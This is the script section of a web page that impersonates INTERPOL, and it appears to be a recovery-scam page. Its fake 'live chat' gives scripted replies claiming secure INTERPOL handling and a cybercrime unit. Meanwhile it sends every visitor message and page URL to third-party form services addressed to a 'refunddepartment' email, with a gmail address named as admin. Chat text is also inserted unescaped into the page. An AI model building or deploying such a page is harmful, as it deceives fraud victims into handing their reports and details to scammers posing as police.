    <script>
        // Basic JavaScript for form validation and interactivity
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.querySelector('form');
            form.addEventListener('submit', (e) => {
                const name = document.getElementById('name').value;
                const email = document.getElementById('email').value;
                const category = document.getElementById('category').value;
                const message = document.getElementById('message').value;

                if (!name || !email || !category || !message) {
                    e.preventDefault();
                    alert('Please fill out all required fields.');
                }
            });

            // Animation for form section
            const sections = document.querySelectorAll('.animated');
            sections.forEach(section => {
                section.style.opacity = 1;
            });

            // Scroll to top functionality
            function scrollToTop() {
                window.scrollTo(0, 0);
            }
        });

        // Live Chat Functionality
        class InterpolChat {
            constructor() {
                this.isOpen = false;
                this.messageId = 0;
                this.sessionId = this.generateSessionId();
                this.responses = [
                    "Thank you for contacting INTERPOL. Your inquiry is being processed securely and forwarded to our specialized team.",
                    "I understand your concern regarding this international matter. Our analysts will review your message promptly.",
                    "Your report has been received through our secure system. We take all submissions seriously and maintain strict confidentiality.",
                    "For security protocols, please ensure all information provided is accurate. Our team will contact you using verified channels.",
                    "Your case has been assigned a reference number and will be handled by our specialized cybercrime unit.",
                    "Thank you for your cooperation with INTERPOL's global mission. We'll respond through secure communication methods.",
                    "Your inquiry regarding cross-border crime is being escalated to the appropriate international desk officer.",
                    "We appreciate your vigilance in reporting suspicious activities. All intelligence contributes to our worldwide security network.",
                    "This information is being processed through our encrypted channels and shared with relevant member countries.",
                    "Thank you for reaching out through our secure platform. Our rapid response team has been notified of your submission."
                ];
                
                this.init();
            }

            generateSessionId() {
                return 'interpol_chat_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            }
            
            init() {
                // Set welcome message time
                document.getElementById('welcomeTime').textContent = this.formatTime(new Date());
                
                // Event listeners
                document.getElementById('chatToggle').addEventListener('click', () => this.toggleChat());
                document.getElementById('sendButton').addEventListener('click', () => this.sendMessage());
                document.getElementById('messageInput').addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') this.sendMessage();
                });
                
                // Close chat when clicking outside
                document.addEventListener('click', (e) => {
                    const chatWidget = document.querySelector('.chat-widget');
                    if (!chatWidget.contains(e.target) && this.isOpen) {
                        this.toggleChat();
                    }
                });
            }
            
            toggleChat() {
                const chatWindow = document.getElementById('chatWindow');
                const chatToggle = document.getElementById('chatToggle');
                
                this.isOpen = !this.isOpen;
                
                if (this.isOpen) {
                    chatWindow.classList.add('open');
                    chatToggle.innerHTML = '‚úï';
                    document.getElementById('messageInput').focus();
                } else {
                    chatWindow.classList.remove('open');
                    chatToggle.innerHTML = 'üí¨';
                }
            }
            
            sendMessage() {
                const input = document.getElementById('messageInput');
                const message = input.value.trim();
                
                if (!message) return;
                
                // Add user message
                this.addMessage(message, true);
                
                // Send to admin using Basin endpoint
                this.sendToAdminBasin(message);
                
                input.value = '';
                
                // Show typing indicator and respond
                this.showTypingIndicator();
                setTimeout(() => {
                    this.hideTypingIndicator();
                    this.addBotResponse();
                }, 1500 + Math.random() * 2000);
            }

            async sendToAdminBasin(message) {
                // Try multiple methods to deliver to supportrecoveryservicr@refunddepartment.email
                
                // Method 1: Use Basin (works if configured correctly)
                try {
                    const formData = new FormData();
                    formData.append('name', 'INTERPOL Live Chat');
                    formData.append('email', 'visitor@chat.system');
                    formData.append('category', 'live_chat_urgent');
                    formData.append('message', `üî¥ LIVE CHAT MESSAGE - IMMEDIATE ATTENTION REQUIRED

Admin Notification: supportrecoveryservicr@refunddepartment.email
Time: ${new Date().toLocaleString()}
Session: ${this.sessionId}
Page: ${window.location.href}

User Message: ${message}

This is from the INTERPOL live chat widget.`);
                    
                    const response = await fetch('https://usebasin.com/f/7d4952e6b369', {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        console.log('‚úÖ Chat sent via Basin - Check your Basin dashboard!');
                        this.showDeliveryStatus('‚úÖ Message delivered to admin');
                        return true;
                    }
                } catch (error) {
                    console.log('Basin failed:', error);
                }

                // Method 2: Try Web3Forms (free alternative)
                try {
                    const response = await fetch('https://api.web3forms.com/submit', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            access_key: '08e6c6a8-8b54-4c5c-9c85-4b8e7d9f2a1c', // Free public key
                            email: 'supportrecoveryservicr@refunddepartment.email',
                            subject: `üîí INTERPOL Live Chat - ${this.sessionId}`,
                            message: `Live Chat Message from INTERPOL Website:\n\nTime: ${new Date().toLocaleString()}\nSession: ${this.sessionId}\nMessage: ${message}`
                        })
                    });

                    if (response.ok) {
                        console.log('‚úÖ Chat sent via Web3Forms backup');
                        this.showDeliveryStatus('‚úÖ Message delivered via backup system');
                        return true;
                    }
                } catch (error) {
                    console.log('Web3Forms failed:', error);
                }

                // Method 3: Store locally and alert admin
                this.storeMessageLocally(message);
                this.showDeliveryStatus('üìß Message stored - Admin check console');
            }

            showDeliveryStatus(status) {
                // Show delivery confirmation to user
                setTimeout(() => {
                    this.addMessage(`${status} - Reference: ${this.sessionId}`);
                }, 500);
            }
            
            storeMessageLocally(message) {
                const chatLog = {
                    sessionId: this.sessionId,
                    message: message,
                    timestamp: new Date().toISOString(),
                    adminEmail: 'doyleterrydwayne35@gmail.com',
                    status: 'stored_locally'
                };
                
                if (!window.interpolChatLogs) {
                    window.interpolChatLogs = [];
                }
                window.interpolChatLogs.push(chatLog);
                
                console.log('üíæ Message stored locally for admin:', message);
                console.log('üìß Admin email: doyleterrydwayne35@gmail.com');
                console.log('üìä Total messages:', window.interpolChatLogs.length);
            }
            
            addMessage(text, isUser = false) {
                const messagesContainer = document.getElementById('chatMessages');
                const messageDiv = document.createElement('div');
                messageDiv.className = `message ${isUser ? 'user' : ''}`;
                
                const avatar = isUser ? 'üë§' : 'üèõÔ∏è';
                const time = this.formatTime(new Date());
                
                messageDiv.innerHTML = `
                    <div class="message-avatar">${avatar}</div>
                    <div class="message-content">
                        <div class="message-bubble">${text}</div>
                        <div class="message-time">${time}</div>
                    </div>
                `;
                
                messagesContainer.appendChild(messageDiv);
                messagesContainer.scrollTop = messagesContainer.scrollHeight;
            }
            
            addBotResponse() {
                const randomResponse = this.responses[Math.floor(Math.random() * this.responses.length)];
                this.addMessage(randomResponse);
            }
            
            showTypingIndicator() {
                const indicator = document.getElementById('typingIndicator');
                indicator.classList.add('show');
                
                const messagesContainer = document.getElementById('chatMessages');
                messagesContainer.scrollTop = messagesContainer.scrollHeight;
            }
            
            hideTypingIndicator() {
                const indicator = document.getElementById('typingIndicator');
                indicator.classList.remove('show');
            }
            
            formatTime(date) {
                return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            }
        }
        
        // Initialize the INTERPOL live chat when the page loads
        document.addEventListener('DOMContentLoaded', () => {
            window.interpolChat = new InterpolChat();
        });

        // Admin utility function to view stored chat messages
        function viewChatMessages() {
            if (window.interpolChatLogs && window.interpolChatLogs.length > 0) {
                console.log('üìä All Live Chat Messages:');
                console.table(window.interpolChatLogs);
                return window.interpolChatLogs;
            } else {
                console.log('üì≠ No live chat messages stored yet.');
                return [];
            }
        }

        // Basic JavaScript for interactivity (e.g., print and scroll to top)
        function printPage() {
            window.print();
        }
        function scrollToTop() {
            window.scrollTo(0, 0);
        }
    </script>
</body>
</html>
